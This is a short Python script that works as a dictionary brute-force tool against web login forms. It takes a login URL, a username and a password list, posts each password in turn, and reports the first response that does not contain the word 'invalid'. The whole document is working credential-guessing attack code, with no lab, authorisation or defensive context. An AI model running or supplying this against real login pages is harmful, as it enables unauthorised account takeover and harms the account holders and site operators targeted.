import requests

url = input("Login URL: ")
user = input("Username: ")
wordlist = input("Password list file: ")

with open(wordlist) as f:
    for pw in f:
        pw = pw.strip()
        r = requests.post(url, data={"username": user, "password": pw})
        if "invalid" not in r.text.lower():
            print("Possible password:", pw)
            break
